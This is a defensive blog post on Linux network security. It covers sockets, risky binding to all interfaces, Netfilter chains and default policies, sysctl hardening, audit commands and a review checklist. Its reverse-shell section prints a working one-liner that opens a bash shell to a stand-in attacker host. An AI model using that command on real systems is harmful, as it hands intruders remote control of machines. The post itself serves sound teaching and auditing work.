---
layout: post
title: "Linux Security - Networking & Network Security"
date: 2025-11-20 10:00:00 +0000
categories: [linux-security]
tags: [linux-security]
author: Application Security Engineer
comments: true
excerpt: "Linux systems are constantly exposed to network traffic, making secure network configuration essential to prevent unauthorized access and remote attacks."
---

# Linux Security Internals: Networking & Network Security

## 1. The Core Abstraction: Sockets
In Linux, **"Everything is a File"** applies to networking too. A network connection is represented by a **Socket** (a file descriptor).

### Types of Sockets
1.  **Network Sockets (Internet):** Used for communication across a network (IP:Port).
    * **TCP:** Connection-oriented (Web, SSH, DB).
    * **UDP:** Fire-and-forget (DNS, NTP, VPN).
2.  **Unix Domain Sockets (IPC):** Used for communication between processes on the **same kernel**.
    * *Example:* Docker CLI talking to the Docker Daemon often uses `/var/run/docker.sock`.
    * *Security Note:* Permissions on socket files matter! If `/var/run/docker.sock` is world-writable, any user can gain root access.

---

## 2. Ports and Binding (The Attack Surface)
Processes "bind" to a port to listen for incoming data.

### Privileged vs. Ephemeral
* **Privileged Ports (0–1023):** Only **Root** (or a binary with `CAP_NET_BIND_SERVICE`) can bind to these.
    * *Review Check:* If you see a non-root process (like `nginx` running as `www-data`) listening on port 80, the parent process likely started as root, bound the port, and then dropped privileges (a safe pattern).
* **Ephemeral Ports (1024–65535):** Any user can bind to these.
    * *Risk:* Malware often hides here.

### The "Binding Interface" Risk
This is the #1 finding in network reviews.
* **127.0.0.1 (Localhost):** The service is only accessible from *inside* the machine. (Safe for internal DBs, admin panels).
* **0.0.0.0 (All Interfaces):** The service accepts connections from **anywhere** (WiFi, Ethernet, VPN).
    * *Critical Finding:* A database (MySQL/Redis) bound to `0.0.0.0` without a firewall is exposed to the public internet.

---

## 3. The Kernel Firewall: Netfilter
Tools like `iptables`, `ufw`, `firewalld`, and `nftables` are just user-space front-ends. The actual firewall logic happens inside the Linux Kernel module called **Netfilter**.



### The Chains (Packet Lifecycle)
1.  **PREROUTING:** Packet just arrived. (DNAT happens here).
2.  **INPUT:** Packet is destined for **this local machine**.
3.  **FORWARD:** Packet is just passing through (Router mode).
4.  **OUTPUT:** Packet is created by **this local machine** and leaving.
5.  **POSTROUTING:** Packet is about to leave. (SNAT/Masquerade happens here).

### ❓ Q&A: The "Default Policy" Trap
**Q: I see a lot of rules allowing traffic. Is the firewall secure?**
**A: Not necessarily.** Look at the **Policy** at the top of the chain.
* **Secure:** `Chain INPUT (policy DROP)` -> Whitelist approach (Everything blocked unless explicitly allowed).
* **Insecure:** `Chain INPUT (policy ACCEPT)` -> Blacklist approach (Everything allowed unless explicitly blocked).

---

## 4. Kernel Network Parameters (sysctl)
The networking stack behavior is controlled by kernel files in `/proc/sys/net/`.

| Parameter | Recommended Setting | Why? |
| :--- | :--- | :--- |
| `net.ipv4.ip_forward` | **0** (Disabled) | If set to **1**, the machine acts as a router. Attackers can use it for Man-in-the-Middle attacks. |
| `net.ipv4.conf.all.accept_redirects` | **0** (Disabled) | Prevents malicious routers from redirecting your traffic. |
| `net.ipv4.icmp_echo_ignore_broadcasts` | **1** (Enabled) | Prevents Smurf attacks (DoS amplification). |
| `net.ipv4.tcp_syncookies` | **1** (Enabled) | Mitigates TCP SYN Flood attacks. |

---

## 5. Reverse Shells (The Intruder's Lifeline)
In a review, you aren't just looking for open ports (Ingress); you look for suspicious **outgoing** connections (Egress).

* **Bind Shell (Ingress):** Attacker connects TO the server. Blocked by most firewalls.
* **Reverse Shell (Egress):** The server connects TO the attacker.
    * *Command:* `bash -i >& /dev/tcp/attacker.com/443 0>&1`
    * *Why it works:* Most Linux servers allow unrestricted outbound traffic to port 443 (HTTPS).

---

## 6. Audit & Hunting Commands

**1. The "State of the Nation" (Modern Way):**
`ss` is the replacement for `netstat`.
```bash
# -t (tcp), -u (udp), -l (listening), -p (processes), -n (numeric)
ss -tulpn
```

Look for: Services listening on 0.0.0.0 that should be 127.0.0.1.

## 2. List Open Files (Network Mode): Find exactly which files/libraries a network process is using.
```bash
# -i (internet files), -n (numeric)
lsof -i -n -P
```

3. Check Firewall Rules:
```bash
iptables -L -v -n
# OR
nft list ruleset
```

## 4. Check for Promiscuous Mode: If an interface is in "PROMISC" mode, it might be sniffing traffic on the network.

```bash
ip link show | grep PROMISC
```
---

## 7. Review Checklist
Exposure: Are internal services (Redis, MongoDB, Admin UI) bound to 0.0.0.0?

Firewall: Is the default INPUT policy set to DROP?

Forwarding: Is ip_forward disabled (sysctl net.ipv4.ip_forward)?

Sockets: Are /var/run/ sockets protected from world-write permissions?

Anomalies: Are there established TCP connections to unknown external IP addresses on weird ports (Reverse Shells)?
